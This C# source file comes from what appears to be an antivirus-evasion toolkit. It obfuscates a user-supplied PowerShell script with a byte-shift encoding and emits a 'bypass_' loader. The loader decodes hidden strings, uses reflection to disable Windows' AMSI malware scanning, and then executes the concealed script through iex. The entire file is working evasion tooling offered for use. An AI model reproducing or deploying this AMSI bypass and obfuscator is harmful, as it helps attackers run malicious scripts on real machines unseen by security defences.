using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;

namespace Kill_free_toolbox.Helper.PowershellObf
{
    internal class PowershellObf
    {
        public static void Obfuscate(string inputFilePath)
        {

            string fileName = Path.GetFileName(inputFilePath);
            string dir = $@"{Environment.CurrentDirectory}\build";
            string outputFilePath = $@"{Environment.CurrentDirectory}\build\bypass_{fileName}";

            try
            {
                // 检查文件夹是否存在，如果不存在则创建它
                if (!Directory.Exists(dir))
                {
                    Directory.CreateDirectory(dir);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("Error: " + ex.Message);
            }


            string c = inputFilePath;


            string fileContent = File.ReadAllText(c);
            byte[] result = Encrypt(Encoding.ASCII.GetBytes(fileContent));
            string obfuscatedScript = $"[Byte[]]$c = [System.Convert]::FromBase64String('{Convert.ToBase64String(result)}')\n" +
                                      $"[Byte[]]$d = [System.Convert]::FromBase64String('amNga0xgamQ4JWVmYGtYZGZrbDgla2VcZFxeWGVYRCVkXGtqcEo=')\n" +
                                      $"[Byte[]]$e = [System.Convert]::FromBase64String('W1xjYFg9a2BlQGBqZFg=')\n" +
                                      $"{ObfuscateFunction()}\n";
            File.WriteAllText(outputFilePath, obfuscatedScript);
            try
            {
                System.Diagnostics.Process.Start("explorer.exe", dir);
            }
            catch
            {
                // 忽略打开资源管理器失败
            }
        }
        static byte[] Encrypt(byte[] input)
        {
            int y = 9;
            while (y > 6)
            {
                byte[] temp = new byte[input.Length];
                for (int x = 0; x < input.Length; x++)
                {
                    temp[input.Length - x - 1] = (byte)(input[x] - 3);
                }
                input = temp;
                y--;
            }
            return input;
        }
        static string ObfuscateFunction()
        {
            return @"
function O ($v)
{
    [Byte[]]$t = $v.clone()
    for ($x = 0; $x -lt $v.Count; $x++)
    {
        $t[$v.Count - $x - 1] = $v[$x] + 3
    }
    return $t
}
$y = 9
while($y -gt 6){
    $c = O($c)
    $d = O($d)
    $e = O($e)
    $y = $y - 1
}
[Ref].Assembly.GetType([System.Text.Encoding]::ASCII.GetString($d)).GetField([System.Text.Encoding]::ASCII.GetString($e),'NonPublic,Static').SetValue($null,$true)
iex([System.Text.Encoding]::ASCII.GetString($c))
";
        }
    }

}
